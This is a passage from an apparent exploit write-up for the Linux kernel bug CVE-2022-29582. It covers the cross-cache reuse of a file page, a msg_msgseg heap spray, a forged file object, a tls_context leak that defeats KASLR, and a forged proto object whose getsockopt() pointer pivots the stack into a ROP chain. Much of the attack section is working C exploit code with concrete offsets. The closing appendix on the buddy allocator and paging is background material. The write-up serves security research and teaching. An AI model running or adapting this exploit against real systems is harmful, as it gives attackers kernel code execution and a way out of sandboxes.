In step 6 we free one object per page for all those pages filled up in step 1. Because we've already reserved one spot on the partial list, when we get to the limit, we'll invoke `unfreeze_partials()` as desired! All of the slabs will go onto the node list except our target slab who has had far too much to drink (*is singing Empty Pages by Traffic*) and needs to go home immediately (*please someone get an uber*). See appendix for a directly related article on the cross-cache steps.

### Page reallocation
Now that we've freed our target page the next step is to reallocate the target page -- but now for a different cache. Because `file` objects approach 512 bytes in size, `kmalloc-512` is the best choice for us.

This seems a little arbitrary though, doesn't it? Why not `kmalloc-1k` or `kmalloc-2k`? The simple answer is that we aren't actually as free as we thought we were (*whoa*). Jokes aside, page reallocation is slightly constrained. We can indeed reallocate a page to any cache but there's also some barriers to this which can reduce reliability. A brief discussion of this follows.

#### The buddy allocator
Each cache uses slabs which are of a certain **order**. An order describes the number of pages to conjoin together when servicing a request. For example, take `kmalloc-4k`. It doesn't really make sense to just give 'em 4096 bytes for a new slab - the cache will be back for another go before we can count to 10. Instead, `kmalloc-4k` typically gets 2^3 pages, the order of this cache being 3.
<figure>
<img src="/img/posts/cve-2022-29582/buddy.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Per-order lists holding slabs of conjoined pages</i></center></figcaption>
</figure>
On the other hand, as seen above, `file` objects (of size 384) and `kmalloc-512` objects (of size between 256 and 512) sit on slabs of order-1. This means that if we free the `filp` page, it's probably easier to directly target the order-1 list when trying to allocate it back out. There are ways around this if we game the buddy allocation algorithm to split up a higher order block (see appendix). But we went with `kmalloc-512`.

## Reallocating as `msg_msgseg`
Now we are in the home stretch. To reallocate the page(s) for `kmalloc-512` we'll actually be attempting to write over the `file` with the contents of a `msg_msgseg`. We can do this using a method typically called **heap spraying** (aka spamming the shit out of `msgsnd()`). There are other ways to spray the heap - namely, using keyrings, socket messages, or extended attributes, but the System V IPC APIs are a tried-and-tested technology that is easy to use.

For our first peek at the exploit code, this is where we're at:
```c
static inline err_t reallocate_filp_page(struct manager *mgr)
{
    IF_ERR_RET(spray_msg(mgr->msq_ids, TOTAL_MSGS, mgr->spray, MSG_SIZE))
    memset((char *)mgr->spray, 0x00, MSG_SIZE);
    return SUCC;
}

err_t spray_msg(uint64_t *store, uint32_t amount, char *data, uint64_t size)
{
    int32_t ret = 0;
    struct msgb* msg = (struct msgb*)data;

    for (uint32_t i = 0; i < amount; i++) {
        msg->mtype = i + 1;
        ret = msgsnd(store[i], msg, size, 0);
        IF_ERR(ret) {
            perror("spray_msg:msgsnd");
            return ERR;
        }
    }

    return SUCC;
}
```
For us, we had `TOTAL_MSGS` at 9999 and `MSG_SIZE` at 4500. The former is probably a bit excessive but better to be safe than sorry. The latter needs some explaining. 

Since we're targeting the `kmalloc-512` cache, we'll need to allocate objects of size between 256 and 512. So why 4500? When we use the SystemV IPC messaging protocol, each individual message may be broken down into smaller messages depending on its size. The first piece of a message is limited to 4096 - 48 bytes: the size of a page with room for the `msg_msg` metadata header. But if our message exceeds this limit then we'll get a single `msg_msg` to start things off, then however many `msg_msgseg` are needed to satisfy the request. All of them are linked together like a happy row of ducklings waddling into the furnaces of hell.

<figure>
<img src="/img/posts/cve-2022-29582/msg.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>msg_msg vs. msg_msgseg</i></center></figcaption>
</figure>
Now, we could just have a `MSG_SIZE` of 512 - 48. But the problem is that 48 bytes at the header. We don't control it. So the data initialised there might influence control flow in weird and whacky ways -- far beyond the comprehension of mere mortals. So, we'll stick to the alternative: the `msg_msgseg` with its 8 byte header. Hence, a 4500 byte message split into two parts. 

After spamming `msg_msgseg` objects into the heap, eventually the old `filp` page will be reallocated for `kmalloc-512`. This isn't 100% reliable. But when it works, it really works.

### `msg_msgseg` use-after-free
So, some news. We're going to trigger a third Use-After-Free. 
That's crazy! Another one? Why?! 

Well, unless we happen to be on a system which is ideologically opposed to KASLR factionalism or we're psychic and can *reach* into the computer and *touch* the kernel base address with our mind, then we'll first need an information leak (or a side-channel attack) before we can write properly defined objects to the heap. 

To get a leak, we need to write over the `msg_msgseg` with another type of object. Then we can receive the message with `msgrcv()`. Once we've got the msg in our userspace buffer, we'll read out the overlaid object's data and use it to calculate the kernel base address. So we want the object we're leaking to contain a pointer into a read-only section of the kernel image. But first, we need to free the  `file` (again).

#### Freeing the file 
Thinking back to what our page Use-After-Free means: we can use data currently on this page as if that data comprised a `file` object. How? We have a file descriptor in userspace whose associated `file` is now part of a `msg_msgseg` due to cross-cache. 

Our first instinct here might be to call `close(fd)`. Since this was the last tangible reference to the `file`, closing should free it (again). But we notice something deeply disturbing in the `close()` implementation which requires us, hands shaking and sweat forming on our brow, to sulk down into a chair and question our life choices: 
```c
int filp_close(struct file *filp, fl_owner_t id)
{
	int retval = 0;

	if (!file_count(filp)) {
		printk(KERN_ERR "VFS: Close: file count is 0\n");
		return 0;
	}

	if (filp->f_op->flush)
		retval = filp->f_op->flush(filp, id);

	if (likely(!(filp->f_mode & FMODE_PATH))) {
		dnotify_flush(filp, id);
		locks_remove_posix(filp, id);
	}
	fput(filp);
	return retval;
}
```
As we can see, overwriting the `file` object with say, all `NULL`, would run us into three hurdles: 
- `file_count(filp)` would give the refcount: 0, `filp_close()`  returning prematurely. 
- Even if we got passed the first hurdle, `filp->f_op` would be `NULL` and so we'd crash the kernel while checking if `flush()` is defined. 
- Finally, we probably want to reduce the complexity of our ascent to Use-After-Free. So, we'd like `FMODE_PATH` to be set in `filp->f_mode`.

Of the three, setting the refcount to 1 and the mode to `FMODE_PATH` is easy. We just calculate the offset of these fields in the `file` relative to where our `msg_msgseg` will be overlaid and then write to them. But ensuring that `filp->f_op` is defined and `filp->f_op->flush` is not defined takes a little more finessing. The minimum requirement here is that we have a valid kernel pointer to stand-in for `f_op`. Further, we need `flush()` to be `NULL`, meaning `f_op + 0x70` has to be `NULL`.
```c
/* We write this pointer to file->f_op so that f_op->flush == NULL.
 * This address and its contents are invariant across boots. */
#define NULL_MEM (0xfffffe0000002000)
```
In spite of KASLR and heap offset randomisation we found an address which satisfies our requirement across all executions of the target kernel (see appendix for more information). 

```c 
static inline void set_file_spray_data(struct manager* mgr)
{
    /* Construct a fuzzy file object */
#define F_OP_OFF (88)
#define REF_OFF (128)
#define F_MODE_OFF (140)
#define MSGSEG_OFF (4000)

    memset((char *)mgr->spray, 0, MSG_SIZE);

    char *file_contents = (char *) mgr->spray + MSGSEG_OFF;
    uint8_t *f_op = file_contents + F_OP_OFF;
    uint8_t *refcount = file_contents + REF_OFF;
    uint8_t *f_mode = file_contents + F_MODE_OFF;

    *(uint64_t *) f_op = NULL_MEM;
    *(uint64_t *) refcount = 1;
    *(uint64_t *) f_mode = 0x4000;
}
```

So, to at least give the illusion of a valid `file` object, we prepare the file fields, as above, and spray the fake `file` objects into the heap as seen earlier. 

```c
static inline err_t double_free_file(struct manager *mgr, int32_t *hits)
{
    for (int i = 0; i < hits[N_PIPES]; i++) {
        int p_idx = hits[i];
        int in = mgr->pipes_in[p_idx][RD];
        close(in);
    }
    return SUCC;
}
```
We are able to free the `file` again, causing a `msg_msgseg` Use-After-Free. The `file` object is given back to the slab, resolved via the `page` from whence it came, to `kmalloc-512`.

This means we need to find another type of object to overlay onto the dangling `msg_msgseg`. This object should have a kernel read-only section pointer and must come from the `kmalloc-512` cache (to capture the `msg_msgseg`).

## TLS who? `tls_context` 
After extensive research based on the scientific method of testing and invalidating hypotheses (aka going through a list of objects with a size inbetween 257 and 512 bytes), we found a candidate type, `tls_context` 

<figure>
<img src="/img/posts/cve-2022-29582/tlsfields.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>TLS context target fields</i></center></figcaption>
</figure>

As seen above, we have a `list_head` whose `next` and `prev` fields will point back to their own addresses. By subtracting `0x98` from `list.next` we get the address of our `tls_context` object.

Even better, each `tls_context` has a `proto` pointer to `tcp_prot`. This object has two awesome features. For one, its address is a constant offset from the kernel base. So reading out field `sk_proto == &tcp_prot` means a way around KASLR. Further, it's got a bunch of function pointers. So if we can forge a fake `proto` object then we've got the main ingredient for arbitrary code execution. As we might've guessed from the diagram, we are specifically going to target `getsockopt()`. 

### Reallocating as `tls_context`
```c
socket(AF_INET, SOCK_STREAM, 0);
```
To spray `tls_context` objects into the kernel heap, and therefore to write over our dangling `msg_msgseg`, we pre-prepare a bunch of sockets as above.

```c
struct sockaddr_in server;
inet_aton("127.0.0.1", &server.sin_addr);
server.sin_port = htons(9999);
server.sin_family = AF_INET;
if (connect(fd, (struct sockaddr*)&server, sizeof(server))) {
    perror("connect");
    return ERR;
}
tls_fds[i] = fd;
```
We connect each new socket to a local server.

```c
int fd = tls_fds[i];
// struct tls_context allocation in kmalloc-512
if (setsockopt(fd, SOL_TCP, TCP_ULP, "tls", sizeof("tls"))) {
    perror("setsockopt(fd, SOL_TCP, TCP_ULP, \"tls\"");
    printf("fd: %d\n", fd);
    return ERR_UNFIN(i);
};
```
Then when we are actually ready (after all the preceding exploit stages) we upgrade these connected sockets and in doing so, allocate a `tls_context` for each one.

### Leaking `tls_context`
```c 
static inline err_t leak_tls_contexts(struct manager *mgr)
{
    char *leak = (char *)mgr->leak;
    uint64_t *store = mgr->msq_ids;
    IF_ERR_RET(leak_msg(DEAD_LIST_PATTERN, store, TOTAL_MSGS, leak, MSG_SIZE))
    print_leak(leak);
    return SUCC;
} 
```
Now that one of our messages contains the `tls_context` we can attempt to find the `DEAD_LIST_PATTERN` in some message whose ID is stored in `mgr->msq_ids` and whose contents will be output to `mgr->leak`. Importantly, receiving a message will free it. So now we have a **`tls_context` Use-After-Free** (lol). 

### Overwriting `tls_context`
```c
static inline err_t prepare_tls_overwrite(struct manager *mgr)
{
#define KHEAP_PTR_OFF (200)
#define RO_PTR_OFF (224)
#define LIST_OFF (0x98)
#define BASE_OFF (0x180b660)
#define MSGSEG_OFF (4000)    
    /* Extract pointers and wipe the data, ready for spray. */
    char *leak = (char *)mgr->leak + MSGSEG_OFF;
    uint64_t tls_context = *(uint64_t*)&leak[KHEAP_PTR_OFF] - LIST_OFF;
    uint64_t kernel_base = *(uint64_t*)&leak[RO_PTR_OFF] - BASE_OFF;
    printf("[+] Current tls_context @ %lx\n", tls_context);
    printf("[+] Kernel base @ %lx\n", kernel_base);
    memset((char *)mgr->leak, 0, MSG_SIZE);

#define GETSOCKOPT_OFF (40)
#define SK_PROTO_OFF (136)
    /* Prepare sk_proto overwrite, getsockopt() overwrite,
     * stack pivot, and ROP chain contents. */
    char *spray = (char *)mgr->spray;
    prepare_rop(&spray[8], kernel_base);
    *(uint64_t*)&spray[GETSOCKOPT_OFF] = kernel_base + STACK_PIVOT_OFF;;
    *(uint64_t*)&spray[SK_PROTO_OFF] = tls_context;

    ...

    return SUCC;
}
```
Finally, we take out all of the information we need, calculate the data we want to overwrite the `tls_context` object. To break it down a bit we have two phases in this function:
- Leak `tls_context` data:
    - The address of the `tls_context` `list_head` `next` pointer. This allows us to calculate the address of the `tls_context` by subtracting `0x98` from `list.next`.
    - The address of `tcp_prot` stored in `sk_proto`. This allows us to calculate the kernel base address by subtracting `0x180b660` from `&tcp_prot`.

- Prepare forged `tls_context` data:
    - To overwrite part of the `tls_context` with a set of ROP gadgets.
    - To overwrite `sk_proto` with the `tls_context` address. So now the part of the `tls_context` object contains our fake `proto` object. 
    - To overwrite `sk_proto->getsockopt()` with the address of a **stack pivot gadget**, remembering that `sk_proto == &tls_context` due to witchcraft. The fake stack will start inside the `tls_context` object, specifically where we write our ROP chain.

Then we'll reallocate the previously freed `msg_msgseg` with our fake `tls_context`. 

<figure>
<img src="/img/posts/cve-2022-29582/pivot.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>TLS context polymorphism by memory corruption</i></center></figcaption>
</figure>
As we can see, the `tls_context` object has taken on multiple roles. It's partially a fake `proto` object implementing our stack pivoting `getsockopt()`. It's also partially a fake stack which houses a ROP chain.

## Code execution
The final piece of the puzzle is to trigger the stack pivot. We know that calling `getsockopt()` on that one lucky socket with that one lucky `tls_context` will run the stack pivot code. 
```c
err_t run_machine(struct manager *mgr)
{
    char *spray = mgr->spray;
    uint64_t tls_context = *(uint64_t*)&spray[SK_PROTO_OFF];
    uint64_t pivot_stack = tls_context + 0x20;

    /* Transfer control inside child task */
    if (!fork()) {
        /* Hopefully run along the ROP chain */
        puts("[+] Calling getsockopt() to trigger execution.");
        getsockopt_all_tls(0x41414141, 0x42424242,
                           pivot_stack, 0x8181818181818181);
    }
    /* Busyloop to prevent exit. */
    for (;;);
    __builtin_unreachable();
}

err_t getsockopt_all_tls(int level, int name, void *value, void* len)
{
    for (int i = 0; i < N_TLS_FDS; ++i) {
        IF_ERR(tls_fds[i]) {
            perror("getsockopt_all_tls:fd=-1");
            return ERR;
        }
        getsockopt(tls_fds[i], level, name, value, len);
    }
    return SUCC;
}
```
According to the calling convention on our target machine, we can control all bytes of the `RCX` register through the `value` argument to `getsockopt()`. Our stack pivot gadget, which replaces `getsockopt()` in the target, moves the value in `RCX` (`tls_context + 0x20`) into `RSP` (to use this fake stack) and then returns. The ROP chain, sitting at `tls_context + 0x20`, begins.

# Preemptive FAQs
1. *Why did you perform cross-cache from the `struct file` cache? Why not just do it from `io_kiocb`?* The short answer is that `io_kiocb` has too many annoying fields which led to kernel crashes. There's no long answer.
2. *Were there really no other avenues to attack? It seems like there's a lot of general cache objects in use by each `io_kiocb`, aren't they good targets?* We couldn't find any. The main problem was that the destruction of these other general cache objects (e.g. `io_buffer` or `async_data`) are tied directly to the full destruction of their encapsulating `io_kiocb`. This means that we trigger our old pal **refcount saturation** due to the 0 `io_kiocb` refcount, before we're even given a chance to enter the appropriate destruction path. The `sp->file_in` refcount is decremented immediately when we unblock. But if there's a simpler way, then there's a better way. So please let us know if you figure something out :).
3. *If you could gain a file Use-After-Free, why not mount a file permissions attack?* We did go with this originally -- we attempted to swap out a read-only file handle (on `/etc/passwd`) for one allowing us to write. But in the KCTF environment you need to breach the NSJAIL directly or in our case with a memory corruption bug, launching a ROP chain to abolish the prison-industrial complex.

# Appendix

## References
A **reference** is a relationship between a referrer and a referee. Typically this is just a pointer from one object to another. There is this idea in program correctness of "dangling references" or "stale pointers". When a pointee is destroyed and another object retains a pointer to it then there is a risk that the pointing object will follow the stale pointer to a stale pointee. 

A `refcount_t refs` field is embedded in each `io_kiocb` in order to manage references explicitly. This is just a wrapper around an atomic variable of type `int`. When we need to refer to an object from another object we increment the pointee's `refcount`. When we don't need the reference anymore we decrement it. 

Of course, we could just use a raw C integral type as some other kernel data structures indeed do. But the `refcount_t` wrapper offers additional protection as it conforms to **refcount saturation semantics**. These ensure that the refcount stays within correct bounds and warns us if the refcount (and therefore reference) is behaving weirdly:
```c
	REFCOUNT_ADD_NOT_ZERO_OVF:
		REFCOUNT_WARN("saturated; leaking memory");

	REFCOUNT_ADD_OVF:
		REFCOUNT_WARN("saturated; leaking memory");

	REFCOUNT_ADD_UAF:
		REFCOUNT_WARN("addition on 0; use-after-free");

	REFCOUNT_SUB_UAF:
		REFCOUNT_WARN("underflow; use-after-free");

	REFCOUNT_DEC_LEAK:
		REFCOUNT_WARN("decrement hit 0; leaking memory");
```
But refcounts do more than warn us. By only accessing the `refs` field through the refcount API `refcount_inc(&req->refs)`, `refcount_dec(&req->refs)`, etc. we also prevent things like double-frees since once an object is freed because its refcount is `0` the API ensures it can't be freed again. 

## The (simplified) buddy algorithm
In the Linux kernel page allocator implementation pages are grouped into zones. Inside zones, however, they're organised on two main bases. One is the migration type which determines whether a page can be repurposed to maintain contiguity for a new allocation - meaning its contents have to be moved out of there. More importantly for us is the `free_area[]`. This is an array of 11 lists - one for each order.

We can consider the `zone`, the `order`, and the `free_area[i]` list to be data for the buddy algorithm. The (simplified) buddy algorithm is defined as follows.

Assume all inputs are well-formed.
Assume at least `free_area[10]` is non-empty.

Given input:
* `order`
* `zone`
1. Set `L` to be `zone->free_area[order]->list`.
2. If `L`  has a block, remove it from the list and return it. We were successful.
3. If `L` is empty, then we are in the search state. In this state we keep searching larger-order lists until we find a non-empty one.
4. Once we find a non-empty list, let that list be called `Lk`. Remove the first block from it, denoted by `B`. 
5. If `k == order` then our search is over, return `B`.
6. If `k != order`  then we need to split `B` and so we are in the split state. In this state we:
   - Split `B` in half: `B1` and `B2`.
   - `B1` goes on the `k - 1`th list.
   - `B2` is our candidate block. 
   - Set `B` to `B2`. 
   - Set `k` to `k - 1`
   - goto 5.
 
Note that when we can't find a suitable object on the list for our given `order`, we attempt to find one by splitting an item from the `order + 1` list into two halves. These halves are called "buddies". This tells us where the algorithm got its name. But more importantly, it has a bearing on the inverse operation. When both buddies are freed back to the page allocator, they are coalesced and moved up to the `order + 1` list, recursively. While one is allocated, however, the other remains in the `order` list, waiting for its buddy so they can one day return to the `order + 1`, then maybe to `order + 2`, `order + 3`, and so on.

For an interesting discussion on gaming the buddy allocator see [this article](https://etenal.me/archives/1825) on page allocator Feng Shui.

## Memory whose addresses are constant
We have to find these [things](https://0xax.gitbooks.io/linux-insides/content/MM/linux-mm-2.html)

## Why pages?
Modern computers are just really weird, we dunno what else to say!
### Paging: background
On a more serious note, pages are cool because they enable paging which enables **address space virtualisation**. With this, we abstract away from the complex details of physical memory management towards a more coherent, flexible, and secure memory layer. 

A virtual address space is comprised of **virtual pages**. These in turn map to **physical page frames** represented by the infamous `struct page`. When a process attempts to access memory, the computer must first translate the virtual access into the correct physical access. The virtual address, in combination with data gleaned from the paging data structures, specifies the underlying page frame and some offset into this page frame. In other words, the **paging** subsystem produces and resolves mappings between virtual addresses and physical addresses. There may be many virtual pages mapped to the same physical page frame.

### Paging: motivation
Paging has numerous advantages and use-cases.
- The paging system takes responsibity for address space management away from individual processes and instead makes the kernel deal with it. Each process believes that it has sole ownership over the system memory and so does not need to include explicit logic to protect itself from other processes or to ensure that it doesn't trample on anybody else.
- Paging enables per-page userspace vs. kernelspace separation. A page can be marked as user-accessible or kernel-accessible. E.g. when a userspace application attempts to access kernel memory, a fault is issued -- well, maybe not before this [transient access is cached](https://meltdownattack.com/) ;) . 
- Paging enables page-grained permissions such as read/write/execute. Thus, a page can contain non-executable but readable/writeable data (as in a function stack). Or it can contain executable and readable but non-writeable data (as in the code part of a process image). 
- Paging enables the kernel to **swap** a page's contents out to disk if we are running low on space and to swap it back in when we need it.

### Paging: method
To actually get at the physical memory, we need to combine a given virtual address with data retrieved from the paging data structures. These data structures are collectively called **page tables**. In most modern systems we use **multi-level page tables**.

<figure>
<img src="/img/posts/cve-2022-29582/paging.png" alt="Trulli" style="width:100%">
    <figcaption><center><i>Translating a virtual address to the corresponding page frame number</i></center></figcaption>
</figure>
Apart from being nice to look at, this diagram does also mean something. The idea is that a virtual address is comprised of a bunch of indices (A, B, C, D, E for us). But indices of what? 

At the top level, A is an index into our process' **Page Global Directory**. The value at this index is the location of the relevant **Page Upper Directory**. Then we use B as an index into the **PUD**. The value at this index locates the **Page Middle Directory** which we then peer into with C. This takes us finally to a set of **Page Table Entries** which, combined with D, give us a **page table entry**. The page table entry maps directly to the infamous: **page** or rather, its **page frame number**. But a vague 4096 sized block of memory isn't usually what we're after when we access an address, give us a byte! So finally we use E as an index into the target page frame. 

While the kernel can programmatically resolve a page frame from a virtual address, it is almost always specialised hardware which actively traverses the page tables. On some systems, this is known as the **Memory Management Unit** but is typically integrated directly into the CPU. On x86, when we perform a **context switch**, the physical address of the process' `mm->pgd` is loaded into the `CR3` register. This flushes out any residue page tables in the paging cache (**Translation Lookaside Buffer**). The MMU then starts its translation by reading off the root of the process' page table tree: that PGD reference stored in `CR3`. 

> The first paging structure used for any translation is located at the physical address in CR3. A linear address is translated using the following iterative procedure. A portion of the linear address (initially the uppermost bits) selects an entry in a paging structure (initially the one located using CR3). If that entry references another paging structure, the process continues with that paging structure and with the portion of the linear address immediately below that just used. If instead the entry maps a page, the process completes: the physical address in the entry is that of the page frame and the remaining lower portion of the linear address is the page offset ([Intel® 64 and IA-32 Architectures Software Developer Manuals section 4.2, Volume 3A](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html ))

If the MMU can't find the corresponding page table entry then it raises a page fault. The kernel can handle this either by adding a new page table entry mapping a virtual address to the desired physical address for future lookups (**demand paging**), or it can bail out -- having determined that the access is illegal.
